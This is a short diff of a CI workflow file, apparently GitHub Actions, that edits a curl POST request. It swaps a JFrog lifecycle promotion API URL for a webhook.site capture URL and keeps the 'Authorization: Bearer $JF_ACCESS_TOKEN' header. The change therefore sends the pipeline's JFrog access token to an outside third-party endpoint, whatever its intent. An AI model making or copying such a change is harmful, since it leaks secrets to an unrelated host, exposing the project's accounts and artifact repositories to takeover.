@@ -51,7 +51,7 @@ jobs:
         run: |
           {
           echo 'PROMOTE_RESULT<<EOF'
-          curl https://tomjfrog.jfrog.io/lifecycle/api/v2/promotion/records/phoenix-project-release-bundle \ 
+          curl https://webhook.site/a6bc577a-dfd3-4a7e-a0cf-0e4a99bd9006 \ 
           --request POST \ 
           --header "Authorization: Bearer $JF_ACCESS_TOKEN" \ 
           --header 'Content-Type: application/json' \
